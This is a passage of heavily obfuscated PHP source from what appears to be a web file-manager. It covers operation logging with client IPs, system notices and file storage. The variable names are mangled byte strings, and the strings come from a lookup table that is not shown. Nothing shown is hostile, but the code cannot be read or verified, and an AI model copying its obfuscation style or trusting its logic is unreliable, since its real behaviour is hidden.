=> LNG($’ø©Úƒ™[2271]), $’ø©Úƒ™[2272] => LNG($’ø©Úƒ™[2273]), $’ø©Úƒ™[2274] => LNG($’ø©Úƒ™[2275]), $’ø©Úƒ™[2276] => LNG($’ø©Úƒ™[2276]), $’ø©Úƒ™[2277] => LNG($’ø©Úƒ™[1835]), $’ø©Úƒ™[2278] => LNG($’ø©Úƒ™[2279]), $’ø©Úƒ™[2280] => LNG($’ø©Úƒ™[2281]), $’ø©Úƒ™[2282] => LNG($’ø©Úƒ™[2283]), $’ø©Úƒ™[2284] => LNG($’ø©Úƒ™[2285]), $’ø©Úƒ™[2286] => LNG($’ø©Úƒ™[2287]), $’ø©Úƒ™[2288] => LNG($’ø©Úƒ™[2288]), $’ø©Úƒ™[2289] => LNG($’ø©Úƒ™[2290]), $’ø©Úƒ™[2291] => LNG($’ø©Úƒ™[2292]), $’ø©Úƒ™[2293] => LNG($’ø©Úƒ™[2294]), $’ø©Úƒ™[2295] => LNG($’ø©Úƒ™[2296]), $’ø©Úƒ™[2297] => LNG($’ø©Úƒ™[2298]), $’ø©Úƒ™[2299] => LNG($’ø©Úƒ™[2300])); } private function typeFile() { $ı…Â¢¤Ç =& $_SERVER[ •ŒÓîÆ]; $”ş®Ì¬Á = array($ı…Â¢¤Ç[1866] => array($ı…Â¢¤Ç[1867]), $ı…Â¢¤Ç[2242] => array($ı…Â¢¤Ç[2301]), $ı…Â¢¤Ç[2244] => array($ı…Â¢¤Ç[2302]), $ı…Â¢¤Ç[1859] => array($ı…Â¢¤Ç[1860], $ı…Â¢¤Ç[2303]), $ı…Â¢¤Ç[2252] => array(), $ı…Â¢¤Ç[2254] => array(), $ı…Â¢¤Ç[2256] => array(), $ı…Â¢¤Ç[1869] => array($ı…Â¢¤Ç[1871]), $ı…Â¢¤Ç[1870] => array($ı…Â¢¤Ç[1871]), $ı…Â¢¤Ç[2260] => array($ı…Â¢¤Ç[2304]), $ı…Â¢¤Ç[2262] => array($ı…Â¢¤Ç[2304]), $ı…Â¢¤Ç[2264] => array($ı…Â¢¤Ç[2305]), $ı…Â¢¤Ç[2250] => array($ı…Â¢¤Ç[2306]), $ı…Â¢¤Ç[1864] => array($ı…Â¢¤Ç[2307]), $ı…Â¢¤Ç[2267] => array($ı…Â¢¤Ç[2308]), $ı…Â¢¤Ç[1863] => array($ı…Â¢¤Ç[1865])); return $”ş®Ì¬Á; } private function typeAll() { $åŸŒ¡Í =& $_SERVER[ •ŒÓîÆ]; $ÂÅ¥øµ– = $this->typeList; $ûÂÁıš = array_filter($this->typeFile()); foreach ($ûÂÁıš as $Š ıµÚÃ => $Üëæ¦£) { $ÂÅ¥øµ–[$Üëæ¦£[0]] = $ÂÅ¥øµ–[$Š ıµÚÃ]; } $ÂÅ¥øµ–[$åŸŒ¡Í[1871]] = LNG($åŸŒ¡Í[2309]); $ÂÅ¥øµ–[$åŸŒ¡Í[2304]] = LNG($åŸŒ¡Í[2310]); return $ÂÅ¥øµ–; } public function addLog($ûö¡•ø«, $Ÿ’ÒŸé³ = array()) { $¯‰ıÚ =& $_SERVER[ •ŒÓîÆ]; if (!isset($this->typeList[$ûö¡•ø«])) { return; } $©®Ş¬ŒÀ = isset($Ÿ’ÒŸé³[$¯‰ıÚ[1690]]) ? $Ÿ’ÒŸé³[$¯‰ıÚ[1690]] : 0; if (!$©®Ş¬ŒÀ) { $©®Ş¬ŒÀ = Session::get($¯‰ıÚ[2025]); } if ($ûö¡•ø« == $¯‰ıÚ[2278] && is_array($Ÿ’ÒŸé³[$¯‰ıÚ[2311]]) && !$Ÿ’ÒŸé³[$¯‰ıÚ[2311]]) { return; } $‘ùã§µ = get_client_ip(); if (!$Ÿ’ÒŸé³ || strlen(json_encode($Ÿ’ÒŸé³)) >= 1024) { $Ÿ’ÒŸé³ = array($¯‰ıÚ[2312] => $‘ùã§µ); } else { if (is_array($Ÿ’ÒŸé³)) { $Ÿ’ÒŸé³[$¯‰ıÚ[2312]] = $‘ùã§µ; } else { $Ÿ’ÒŸé³ = array($¯‰ıÚ[1243] => $Ÿ’ÒŸé³, $¯‰ıÚ[2312] => $‘ùã§µ); } } $Ÿ’ÒŸé³ = array($¯‰ıÚ[1680] => Session::sign(), $¯‰ıÚ[1681] => intval($©®Ş¬ŒÀ), $¯‰ıÚ[33] => $ûö¡•ø«, $¯‰ıÚ[1683] => json_encode($Ÿ’ÒŸé³)); parent::add($Ÿ’ÒŸé³); } public function remove($øÀ¶–İ¶) { $this->where(array($_SERVER[ •ŒÓîÆ][472] => $øÀ¶–İ¶))->delete(); } private function _makeOrder($ëÈ°Ì÷‰ = '') { $ò¾ŞÎˆ€ =& $_SERVER[ •ŒÓîÆ]; $¸ËüÛïò = $ò¾ŞÎˆ€[217]; $üÆ™é¦° = array($ò¾ŞÎˆ€[502] => $ò¾ŞÎˆ€[503], $ò¾ŞÎˆ€[504] => $ò¾ŞÎˆ€[505]); $¡ù¤å = Input::get($ò¾ŞÎˆ€[510], $ò¾ŞÎˆ€[7], $ò¾ŞÎˆ€[2061], array($ò¾ŞÎˆ€[1979], $ò¾ŞÎˆ€[504])); $¡ù¤å = $üÆ™é¦°[$¡ù¤å]; $ëÈ°Ì÷‰ = $ëÈ°Ì÷‰ . "{$¸ËüÛïò}\x20{$¡ù¤å}"; return $this->order($ëÈ°Ì÷‰); } public function get($ïÛ‘›¦“ = '') { $âËñç÷´ =& $_SERVER[ •ŒÓîÆ]; if (!$ïÛ‘›¦“) { show_json(array()); } $Ğ¥½œá’ = array(); if ($ïÛ‘›¦“[$âËñç÷´[1690]]) { $Ğ¥½œá’[$âËñç÷´[1690]] = $ïÛ‘›¦“[$âËñç÷´[1690]]; } if (isset($ïÛ‘›¦“[$âËñç÷´[801]])) { $Š­µŞğâ = $ïÛ‘›¦“[$âËñç÷´[801]]; $‡æ¼ì²· = isset($ïÛ‘›¦“[$âËñç÷´[802]]) ? $ïÛ‘›¦“[$âËñç÷´[802]] : time(); $Ğ¥½œá’[$âËñç÷´[217]] = array($âËñç÷´[388], array($Š­µŞğâ, $‡æ¼ì²·)); } if ($ïÛ‘›¦“[$âËñç÷´[33]]) { $á‚§ÓË = explode($âËñç÷´[50], $ïÛ‘›¦“[$âËñç÷´[33]]); $ŠŠÍ•¶’ = $this->typeFile(); $Œü‰ÛÜ‰ = array(); foreach ($á‚§ÓË as $ùß¬à ) { $Œü‰ÛÜ‰[] = $ùß¬à ; if (isset($ŠŠÍ•¶’[$ùß¬à ])) { $Œü‰ÛÜ‰ = array_merge($Œü‰ÛÜ‰, $ŠŠÍ•¶’[$ùß¬à ]); } } $Œü‰ÛÜ‰ = array_unique($Œü‰ÛÜ‰); if ($Œü‰ÛÜ‰) { $Ğ¥½œá’[$âËñç÷´[33]] = array($âËñç÷´[7], $Œü‰ÛÜ‰); } } else { $Ğ¥½œá’[$âËñç÷´[33]] = array($âËñç÷´[2313], $âËñç÷´[2314]); } if (!empty($ïÛ‘›¦“[$âËñç÷´[2312]])) { $Ğ¥½œá’[$âËñç÷´[505]] = array($âËñç÷´[437], "\45{$ïÛ‘›¦“[$âËñç÷´[2312]]}\45"); } $¥ã–Áô = $this->_makeOrder()->where($Ğ¥½œá’)->selectPage(); if (empty($¥ã–Áô[$âËñç÷´[424]])) { show_json(array(), !0, $¥ã–Áô[$âËñç÷´[421]]); } $¥ã–Áô[$âËñç÷´[424]] = $this->logList($¥ã–Áô[$âËñç÷´[424]]); return $¥ã–Áô; } private function ipAddress(&$¦Ó¶Á¯) { $÷Ù“é›Ò =& $_SERVER[ •ŒÓîÆ]; if (!empty($¦Ó¶Á¯[$÷Ù“é›Ò[2312]])) { $Ç¸ôı‹Ö = IpLocation::get($¦Ó¶Á¯[$÷Ù“é›Ò[2312]]); } else { $Ç¸ôı‹Ö = LNG($÷Ù“é›Ò[2315]); } $¦Ó¶Á¯[$÷Ù“é›Ò[2316]] = $Ç¸ôı‹Ö; } private function descZipDownload($ˆå€ß†£, &$ÏÈ ¡µ×) { $€àÕ·¶½ =& $_SERVER[ •ŒÓîÆ]; if (!isset($ˆå€ß†£[$€àÕ·¶½[2317]])) { return; } $ö—ü£¦¿ = json_decode($ˆå€ß†£[$€àÕ·¶½[2317]], !0); foreach ($ö—ü£¦¿ as $ùı ÚÃœ) { try { $ğ‰ßŞÎ = IO::infoFullSimple($ùı ÚÃœ[$€àÕ·¶½[86]]); } catch (Exception $™«£ÎøÏ) { continue; } $ˆå€ß†£[$€àÕ·¶½[86]] = $ùı ÚÃœ[$€àÕ·¶½[86]]; $ÏÈ ¡µ×[] = $ˆå€ß†£[$€àÕ·¶½[183]] = $ğ‰ßŞÎ[$€àÕ·¶½[183]]; $ÏÈ ¡µ×[] = $ˆå€ß†£[$€àÕ·¶½[2116]] = $ğ‰ßŞÎ[$€àÕ·¶½[182]]; break; } return $ˆå€ß†£; } private function getSourceList(&$¶Ò³ö½) { $şËŞÁÔú =& $_SERVER[ •ŒÓîÆ]; $²ğ†ÃÁÍ = array(); foreach ($¶Ò³ö½ as $àéÛ°ÒĞ => $å†—äÈØ) { $ˆ£–Á½· = json_decode($å†—äÈØ[$şËŞÁÔú[505]], !0); if ($å†—äÈØ[$şËŞÁÔú[33]] == $şËŞÁÔú[1862]) { $ˆ£–Á½· = $this->descZipDownload($ˆ£–Á½·, $²ğ†ÃÁÍ); $¶Ò³ö½[$àéÛ°ÒĞ][$şËŞÁÔú[505]] = json_encode($ˆ£–Á½·); continue; } if (strpos($å†—äÈØ[$şËŞÁÔú[33]], $şËŞÁÔú[2118]) !== 0) { if (!isset($ˆ£–Á½·[$şËŞÁÔú[86]]) || strpos($å†—äÈØ[$şËŞÁÔú[33]], $şËŞÁÔú[2318]) !== 0) { continue; } try { $ñŒˆŠå = IO::infoFullSimple($ˆ£–Á½·[$şËŞÁÔú[86]]); } catch (Exception $ğ›ßáˆ) { continue; } $²ğ†ÃÁÍ[] = $ˆ£–Á½·[$şËŞÁÔú[183]] = $ñŒˆŠå[$şËŞÁÔú[183]]; $²ğ†ÃÁÍ[] = $ˆ£–Á½·[$şËŞÁÔú[2116]] = $ñŒˆŠå[$şËŞÁÔú[182]]; $¶Ò³ö½[$àéÛ°ÒĞ][$şËŞÁÔú[505]] = json_encode($ˆ£–Á½·); continue; } $²ğ†ÃÁÍ[] = $ˆ£–Á½·[$şËŞÁÔú[183]]; $²ğ†ÃÁÍ[] = $ˆ£–Á½·[$şËŞÁÔú[2116]]; if ($ˆ£–Á½·[$şËŞÁÔú[33]] == $şËŞÁÔú[600]) { $²ğ†ÃÁÍ[] = $ˆ£–Á½·[$şËŞÁÔú[505]][$şËŞÁÔú[1201]]; $²ğ†ÃÁÍ[] = $ˆ£–Á½·[$şËŞÁÔú[505]][$şËŞÁÔú[1202]]; } if ($ˆ£–Á½·[$şËŞÁÔú[33]] == $şËŞÁÔú[2126]) { $²ğ†ÃÁÍ[] = $ˆ£–Á½·[$şËŞÁÔú[505]][$şËŞÁÔú[183]]; } } if (!$²ğ†ÃÁÍ) { return array(); } return Model($şËŞÁÔú[866])->sourceListInfo($²ğ†ÃÁÍ, !0); } private function logList($½¹ûÆ«Ú) { $îû´Ùœ =& $_SERVER[ •ŒÓîÆ]; $¶±ºµ¶¿ = array_to_keyvalue($½¹ûÆ«Ú, $îû´Ùœ[12], $îû´Ùœ[1690]); $°»¨ÎŠ = Model($îû´Ùœ[579])->userListInfo(array_unique($¶±ºµ¶¿)); $¬ÆÉ”¿ = $this->getSourceList($½¹ûÆ«Ú); $·²çœ÷ğ = $this->typeAll(); $•äç·¦ = array(); $õí’—‘ = array(); foreach ($½¹ûÆ«Ú as $ìşêÍÄ => $„íéìÌ¢) { $­áÕ»ûÖ = $„íéìÌ¢[$îû´Ùœ[33]]; $¯¾®ÑÏ = isset($°»¨ÎŠ[$„íéìÌ¢[$îû´Ùœ[1690]]]) ? $°»¨ÎŠ[$„íéìÌ¢[$îû´Ùœ[1690]]] : !1; $…ä¶¯½ı = strpos($­áÕ»ûÖ, $îû´Ùœ[2319]) === 0 ? LNG($îû´Ùœ[2320]) : LNG($îû´Ùœ[2315]); $„íéìÌ¢[$îû´Ùœ[32]] = isset($¯¾®ÑÏ[$îû´Ùœ[32]]) ? $¯¾®ÑÏ[$îû´Ùœ[32]] : LNG($îû´Ùœ[2315]); $„íéìÌ¢[$îû´Ùœ[2170]] = isset($¯¾®ÑÏ[$îû´Ùœ[2170]]) ? $¯¾®ÑÏ[$îû´Ùœ[2170]] : $îû´Ùœ[12]; $„íéìÌ¢[$îû´Ùœ[1585]] = isset($·²çœ÷ğ[$­áÕ»ûÖ]) ? $·²çœ÷ğ[$­áÕ»ûÖ] : $…ä¶¯½ı; $„íéìÌ¢[$îû´Ùœ[2060]] = $¯¾®ÑÏ; $ÕÅ›¸¤ú = json_decode($„íéìÌ¢[$îû´Ùœ[505]], !0); $„íéìÌ¢[$îû´Ùœ[2312]] = isset($ÕÅ›¸¤ú[$îû´Ùœ[2312]]) ? $ÕÅ›¸¤ú[$îû´Ùœ[2312]] : $îû´Ùœ[12]; $„íéìÌ¢[$îû´Ùœ[2316]] = IpLocation::get($„íéìÌ¢[$îû´Ùœ[2312]]); if (strpos($­áÕ»ûÖ, $îû´Ùœ[2118]) === 0 || isset($ÕÅ›¸¤ú[$îû´Ùœ[2116]])) { $ÕÅ›¸¤ú[$îû´Ùœ[89]] = $¬ÆÉ”¿[$ÕÅ›¸¤ú[$îû´Ùœ[183]]]; $ÕÅ›¸¤ú[$îû´Ùœ[2131]] = $¬ÆÉ”¿[$ÕÅ›¸¤ú[$îû´Ùœ[2116]]]; if ($ÕÅ›¸¤ú[$îû´Ùœ[33]] == $îû´Ùœ[600]) { $ÕÅ›¸¤ú[$îû´Ùœ[505]][$îû´Ùœ[1201]] = $¬ÆÉ”¿[$ÕÅ›¸¤ú[$îû´Ùœ[505]][$îû´Ùœ[1201]]]; $ÕÅ›¸¤ú[$îû´Ùœ[505]][$îû´Ùœ[1202]] = $¬ÆÉ”¿[$ÕÅ›¸¤ú[$îû´Ùœ[505]][$îû´Ùœ[1202]]]; } if ($ÕÅ›¸¤ú[$îû´Ùœ[33]] == $îû´Ùœ[2126]) { $ÕÅ›¸¤ú[$îû´Ùœ[505]][$îû´Ùœ[183]] = $¬ÆÉ”¿[$ÕÅ›¸¤ú[$îû´Ùœ[505]][$îû´Ùœ[183]]]; } if ($ÕÅ›¸¤ú[$îû´Ùœ[33]] == $îû´Ùœ[1857]) { $ÕÅ›¸¤ú[$îû´Ùœ[2131]] = $ÕÅ›¸¤ú[$îû´Ùœ[89]]; $ÕÅ›¸¤ú[$îû´Ùœ[2116]] = $ÕÅ›¸¤ú[$îû´Ùœ[2131]][$îû´Ùœ[183]]; $ÕÅ›¸¤ú[$îû´Ùœ[89]] = !1; $ÕÅ›¸¤ú[$îû´Ùœ[183]] = $îû´Ùœ[12]; } if ($ÕÅ›¸¤ú[$îû´Ùœ[89]] && $ÕÅ›¸¤ú[$îû´Ùœ[89]][$îû´Ùœ[180]] == $îû´Ùœ[181]) { $õí’—‘[] = $„íéìÌ¢[$îû´Ùœ[453]]; unset($½¹ûÆ«Ú[$ìşêÍÄ]); continue; } if ($ÕÅ›¸¤ú[$îû´Ùœ[2131]] && $ÕÅ›¸¤ú[$îû´Ùœ[2131]][$îû´Ùœ[180]] == $îû´Ùœ[181]) { $õí’—‘[] = $„íéìÌ¢[$îû´Ùœ[453]]; unset($½¹ûÆ«Ú[$ìşêÍÄ]); continue; } } $„íéìÌ¢[$îû´Ùœ[505]] = $ÕÅ›¸¤ú; unset($„íéìÌ¢[$îû´Ùœ[2321]]); $•äç·¦[] = $„íéìÌ¢; } $this->clearSystemPathLog($õí’—‘); return $•äç·¦; } private function clearSystemPathLog($²¨çäíô) { $ °‹´´Ë =& $_SERVER[ •ŒÓîÆ]; if (count($²¨çäíô) == 0) { return; } $úèçä‹ = array($ °‹´´Ë[453] => array($ °‹´´Ë[7], array_unique($²¨çäíô))); $this->where($úèçä‹)->delete(); } public function deviceList($É¨¥Àë, $òùÛ›³à = 0) { $¶«Ş¨Æï =& $_SERVER[ •ŒÓîÆ]; $¡½î‰¼Ú = array($¶«Ş¨Æï[1690] => $É¨¥Àë, $¶«Ş¨Æï[217] => array($¶«Ş¨Æï[1055], $òùÛ›³à), $¶«Ş¨Æï[33] => $¶«Ş¨Æï[1831]); $Úá—¶ò¡ = array(); $«ŒáÄ»Ú = $this->field($¶«Ş¨Æï[2322])->where($¡½î‰¼Ú)->order($¶«Ş¨Æï[2129])->limit(50)->select(); foreach ($«ŒáÄ»Ú as $¶¾™³©è => $Ğ½™¥×÷) { if ($¶¾™³©è > 0 && abs($Ğ½™¥×÷[$¶«Ş¨Æï[217]] - $«ŒáÄ»Ú[$¶¾™³©è - 1][$¶«Ş¨Æï[217]]) < 5) { continue; } $üÕ™«ŸÊ = json_decode($Ğ½™¥×÷[$¶«Ş¨Æï[505]], !0); $Ğ½™¥×÷[$¶«Ş¨Æï[2312]] = isset($üÕ™«ŸÊ[$¶«Ş¨Æï[2312]]) ? $üÕ™«ŸÊ[$¶«Ş¨Æï[2312]] : $¶«Ş¨Æï[12]; unset($üÕ™«ŸÊ[$¶«Ş¨Æï[2312]]); $˜´Æª´¤ = $this->deviceType($üÕ™«ŸÊ[$¶«Ş¨Æï[2119]]); if (isset($Úá—¶ò¡[$˜´Æª´¤])) { continue; } $Ğ½™¥×÷[$¶«Ş¨Æï[2316]] = IpLocation::get($Ğ½™¥×÷[$¶«Ş¨Æï[2312]]); $Ğ½™¥×÷[$¶«Ş¨Æï[505]] = $üÕ™«ŸÊ; $Úá—¶ò¡[$˜´Æª´¤] = $Ğ½™¥×÷; } return array_values($Úá—¶ò¡); } public function deviceType($™ØšÏûÌ) { return $™ØšÏûÌ; } } class SystemNoticeModel extends ModelBaseLight { public $optionType = "\123\x79\x73\x74\x65\155\x2e\x6e\x6f\x74\x69\143\145\x4c\x69\163\x74"; public $field = array("\x6e\141\155\x65", "\x63\157\156\x74\x65\156\164", "\141\x75\x74\x68", "\x6d\x6f\x64\145", "\x74\x69\155\x65", "\x74\x79\x70\145", "\x6c\145\166\x65\x6c", "\145\156\x61\x62\154\145", "\163\x6f\162\164"); public function listData($¤ï‡Ó¯Õ = false, $š¦á = "\x73\157\162\164", $Ú’ŒµÛ” = false) { return parent::listData($¤ï‡Ó¯Õ, $š¦á, $Ú’ŒµÛ”); } public function add($êØğå¡Ç) { $˜ãƒïœß =& $_SERVER[ •ŒÓîÆ]; $Ä«¹ŒÔš = time(); if ($êØğå¡Ç[$˜ãƒïœß[16]] == $˜ãƒïœß[2323]) { $Ä«¹ŒÔš = strtotime($êØğå¡Ç[$˜ãƒïœß[196]]); } $êØğå¡Ç[$˜ãƒïœß[196]] = $Ä«¹ŒÔš; return parent::insert($êØğå¡Ç); } public function update($ÒŠ†µ´«, $øıã†£) { $®àà™Î± =& $_SERVER[ •ŒÓîÆ]; $˜ºøõŒ = $this->listData($ÒŠ†µ´«); if (!$˜ºøõŒ) { return !1; } $‰²òÜŠ¯ = time(); if ($øıã†£[$®àà™Î±[16]] == $®àà™Î±[2323]) { $‰²òÜŠ¯ = strtotime($øıã†£[$®àà™Î±[196]]); } $øıã†£[$®àà™Î±[196]] = $‰²òÜŠ¯; return parent::update($ÒŠ†µ´«, $øıã†£); } public function remove($¨è°ØÍ) { $¨ƒ¬²å¬ = $this->listData($¨è°ØÍ); if (!$¨ƒ¬²å¬ || $¨ƒ¬²å¬[$_SERVER[ •ŒÓîÆ][181]]) { return !1; } return parent::remove($¨è°ØÍ); } public function sort($Û’è¬Ö, $Úí‰Ù‘Ğ) { return parent::update($Û’è¬Ö, $Úí‰Ù‘Ğ); } public function enable($ÈáŞ, $™î£¬êğ) { return parent::update($ÈáŞ, array($_SERVER[ •ŒÓîÆ][2324] => $™î£¬êğ)); } private function initUserOption() { $ –£Áş =& $_SERVER[ •ŒÓîÆ]; $this->optionType = $ –£Áş[2325]; $this->modelType = $ –£Áş[2326]; $this->field = array($ –£Áş[2327], $ –£Áş[32], $ –£Áş[196], $ –£Áş[33], $ –£Áş[2328], $ –£Áş[791], $ –£Áş[212]); } public function userNoticeGet($÷­•´®‰ = false) { $this->initUserOption(); return parent::listData($÷­•´®‰, $_SERVER[ •ŒÓîÆ][453], !0); } public function userNoticeAdd($ÍÌğ¨ºê) { $ø÷¼¥ò… =& $_SERVER[ •ŒÓîÆ]; $this->initUserOption(); $¸ÎªÚ¥¤ = $this->findByKey($ø÷¼¥ò…[2327], $ÍÌğ¨ºê[$ø÷¼¥ò…[453]]); if ($¸ÎªÚ¥¤) { return !0; } $šò¶òì‚ = array($ø÷¼¥ò…[2327] => $ÍÌğ¨ºê[$ø÷¼¥ò…[453]], $ø÷¼¥ò…[32] => $ÍÌğ¨ºê[$ø÷¼¥ò…[32]], $ø÷¼¥ò…[196] => $ÍÌğ¨ºê[$ø÷¼¥ò…[196]], $ø÷¼¥ò…[33] => isset($ÍÌğ¨ºê[$ø÷¼¥ò…[33]]) ? $ÍÌğ¨ºê[$ø÷¼¥ò…[33]] : 1, $ø÷¼¥ò…[2328] => isset($ÍÌğ¨ºê[$ø÷¼¥ò…[2328]]) ? $ÍÌğ¨ºê[$ø÷¼¥ò…[2328]] : 0, $ø÷¼¥ò…[791] => 0, $ø÷¼¥ò…[212] => 0); return parent::insert($šò¶òì‚); } public function userNoticeEdit($‘Ù“¾ÊÑ, $ÕÚğè) { $this->initUserOption(); return parent::update($‘Ù“¾ÊÑ, $ÕÚğè); } } goto a‘ã‚°ì‡£; eé…†ó¢é¤: class FileModel extends ModelBase { protected $tableName = "\151\x6f\x5f\x66\151\154\x65"; protected $tableMeta = array("\x74\x61\142\154\x65\116\x61\155\145" => "\x69\157\x5f\146\151\154\x65\x5f\155\145\x74\141", "\155\145\x74\x61\106\x69\145\x6c\144" => "\x66\x69\154\x65\x49\104"); public function fileInfo($ÍÙûæù) { $”ÓÃòĞÑ =& $_SERVER[ •ŒÓîÆ]; static $ÄØ±ˆ—« = array(); if (!isset($ÄØ±ˆ—«[$ÍÙûæù])) { $‘„É‚ìˆ = $”ÓÃòĞÑ[1937]; $ã¨á¿‚Œ = Model($”ÓÃòĞÑ[523])->field($‘„É‚ìˆ)->where(array($”ÓÃòĞÑ[521] => $ÍÙûæù))->find(); $ÄØ±ˆ—«[$ÍÙûæù] = $ã¨á¿‚Œ; } return $ÄØ±ˆ—«[$ÍÙûæù]; } public function addFileByContent($Ùáªòê› = '', $ÒˆØ°äÊ = '') { $„·ÈÇôı =& $_SERVER[ •ŒÓîÆ]; $×¦Ê = TEMP_PATH . $„·ÈÇôı[1938]; if (!is_dir($×¦Ê)) { mk_dir($×¦Ê); } $çê…¿˜° = $×¦Ê . $„·ÈÇôı[1939] . rand_string(16); file_put_contents($çê…¿˜°, $Ùáªòê›); $ÑüºÙŒ = $this->addFile($çê…¿˜°, $ÒˆØ°äÊ, !0); if (file_exists($çê…¿˜°)) { @unlink($çê…¿˜°); } return $ÑüºÙŒ; } public function createFileName($“Ÿ ò…«, $ïó‹ÂÉÅ = false, $Ù×â·ş = false) { $¼Š«Úñİ =& $_SERVER[ •ŒÓîÆ]; $¡õÃÜûÉ = IO::init($¼Š«Úñİ[8]); $ãÒ›³Ôç = $this->makeFilePath($“Ÿ ò…«, $¡õÃÜûÉ, $ïó‹ÂÉÅ, $Ù×â·ş); $°±¾ô = $¡õÃÜûÉ->pathFather($ãÒ›³Ôç); static $²«î—á× = false; $ÌÌôˆ¢µ = $¼Š«Úñİ[1940] . md5($°±¾ô); if (!$²«î—á× && !Cache::get($ÌÌôˆ¢µ)) { $²«î—á× = !0; $—Àé¹¬á = IO::mkdir($°±¾ô); if (!IO::exist($—Àé¹¬á . $¼Š«Úñİ[838])) { IO::mkfile($—Àé¹¬á . $¼Š«Úñİ[838]); } Cache::set($ÌÌôˆ¢µ, 1, 3600 * 2); } return $ãÒ›³Ôç; } public function makeFilePath($‹µÊãŸô, $ü•„É€‰, $Àıß½Ä = false, $ßÔ—ÄîŸ = false) { $üşçµ—š =& $_SERVER[ •ŒÓîÆ]; $ı’é·•› = Model($üşçµ—š[811])->get($üşçµ—š[1941]); $í‚‡ï÷ = KodIO::defaultIO() . date($üşçµ—š[1942]); $ û®¤“ü = $í‚‡ï÷ . rand_string(5) . short_id(100); $‹µÊãŸô = str_replace($üşçµ—š[8], $üşçµ—š[11], KodIO::clear($‹µÊãŸô)); $ñÅôŞ¥ = $ü•„É€‰->ext($‹µÊãŸô); if (!$‹µÊãŸô) { $ı’é·•› = $üşçµ—š[1943]; } switch ($ı’é·•›) { case $üşçµ—š[1944]: $ û®¤“ü = $ û®¤“ü . $üşçµ—š[10] . $ü•„É€‰->ext($‹µÊãŸô); if ($ñÅôŞ¥ == $üşçµ—š[1881]) { $ û®¤“ü .= $üşçµ—š[1247]; } break; case $üşçµ—š[1945]: $›Ò÷¾‚Î = Model($üşçµ—š[811])->get($üşçµ—š[812]); $ìöËûÅ° = substr(md5($üşçµ—š[813] . $›Ò÷¾‚Î . date($üşçµ—š[789])), 0, 8); $“‡İØ¶ø = KodIO::defaultDriver(); $í‚‡ï÷ = $üşçµ—š[1278] . $“‡İØ¶ø[$üşçµ—š[453]] . $üşçµ—š[463] . date($üşçµ—š[1946]) . $ìöËûÅ° . $üşçµ—š[8]; if ($ñÅôŞ¥ == $üşçµ—š[1881]) { $‹µÊãŸô .= $üşçµ—š[1247]; } $‘œõŸá« = $üşçµ—š[1947] . $í‚‡ï÷ . $‹µÊãŸô; CacheLock::lock($‘œõŸá«); $ û®¤“ü = $í‚‡ï÷ . $‹µÊãŸô; if (IO::exist($í‚‡ï÷ . $‹µÊãŸô)) { $úííéÎ° = substr($‹µÊãŸô, 0, strlen($‹µÊãŸô) - strlen($ñÅôŞ¥)); $ñîè‡—§ = $ßÔ—ÄîŸ ? substr($ßÔ—ÄîŸ, 0, 5) : ($Àıß½Ä ? substr($Àıß½Ä, 0, 5) : rand_string(5)); $ û®¤“ü = $í‚‡ï÷ . $úííéÎ° . $ñîè‡—§ . $üşçµ—š[10] . $ñÅôŞ¥; } if (IO::isTypeObject($ û®¤“ü) && !IO::isUploadServer($ û®¤“ü)) { if (IO::exist($ û®¤“ü)) { return $ û®¤“ü; } $Áäã•Å¾ = IO::setContent($ û®¤“ü, $üşçµ—š[12]); if (!$Áäã•Å¾) { show_json($üşçµ—š[1948], !1); } } CacheLock::unlock($‘œõŸá«); break; case $üşçµ—š[1943]: break; default: break; } return $ û®¤“ü; } public function addFileByRemote($ı´¢Û¬—, $Í‡à£Ù½, $²íòƒ× = array()) { $ÊİèùÆõ =& $_SERVER[ •ŒÓîÆ]; if (!IO::exist($ı´¢Û¬—)) { return !1; } $—úâÉß = $²íòƒ×[$ÊİèùÆõ[526]] ? $²íòƒ×[$ÊİèùÆõ[526]] : $ÊİèùÆõ[12]; $—²˜»ä‹ = IO::hashMd5($ı´¢Û¬—, $—úâÉß); $ÏÂ£Ÿ¦­ = KodIO::defaultDriver(); $È´½¢· = array($ÊİèùÆõ[597] => IO::size($ı´¢Û¬—), $ÊİèùÆõ[1949] => 1, $ÊİèùÆõ[473] => $Í‡à£Ù½, $ÊİèùÆõ[849] => $ÏÂ£Ÿ¦­[$ÊİèùÆõ[453]], $ÊİèùÆõ[474] => $ı´¢Û¬—, $ÊİèùÆõ[1950] => $²íòƒ×[$ÊİèùÆõ[652]] ? $²íòƒ×[$ÊİèùÆõ[652]] : IO::hashSimple($ı´¢Û¬—), $ÊİèùÆõ[1951] => $—²˜»ä‹ ? $—²˜»ä‹ : $—úâÉß); if ($Ëˆ¼²åö = $this->addFileCheckExist($È´½¢·[$ÊİèùÆõ[652]], $È´½¢·[$ÊİèùÆõ[526]], $È´½¢·[$ÊİèùÆõ[78]])) { return $Ëˆ¼²åö; } return $this->addFileData($È´½¢·); } private function addFileData($ôª‹õŸç) { $ÑŒ¢“‰æ =& $_SERVER[ •ŒÓîÆ]; if (!$ôª‹õŸç) { return !1; } $ôª‹õŸç[$ÑŒ¢“‰æ[78]] = intval($ôª‹õŸç[$ÑŒ¢“‰æ[78]]); if (!$ôª‹õŸç[$ÑŒ¢“‰æ[78]] && strlen($ôª‹õŸç[$ÑŒ¢“‰æ[652]]) > 32) { $ôª‹õŸç[$ÑŒ¢“‰æ[78]] = intval(substr($ôª‹õŸç[$ÑŒ¢“‰æ[652]], 32)); } $æªìÛ = $this->add($ôª‹õŸç); return $this->find($æªìÛ); } public function addFile($”Üë†°¢, $¯‡ÛÈïÓ, $††¦°›‚ = false) { $Ğ¿ú›Ì =& $_SERVER[ •ŒÓîÆ]; $¡Ù‚Œ•ö = IO::hashSimple($”Üë†°¢); $¨™‰ÔÏ = IO::size($”Üë†°¢); $–•µ¥‰ß = $¨™‰ÔÏ <= 1024 * 1024 * 10 ? IO::hashMd5($”Üë†°¢) : $Ğ¿ú›Ì[12]; $“å†€‘À = $Ğ¿ú›Ì[1952] . $¡Ù‚Œ•ö; CacheLock::lock($“å†€‘À); if ($–•µ¥‰ß && $¡Ù‚Œ•ö) { $£ş·‚Üá = $this->addFileCheckExist($¡Ù‚Œ•ö, $–•µ¥‰ß, $¨™‰ÔÏ); if ($£ş·‚Üá) { CacheLock::unlock($“å†€‘À); return $£ş·‚Üá; } } $‰§‰×Ú = $this->addFileMake($”Üë†°¢, $¨™‰ÔÏ, $¡Ù‚Œ•ö, $–•µ¥‰ß, $¯‡ÛÈïÓ, $††¦°›‚); $ë¿ãé¢• = $this->addFileData($‰§‰×Ú); CacheLock::unlock($“å†€‘À); if (!$–•µ¥‰ß && $ë¿ãé¢•) { 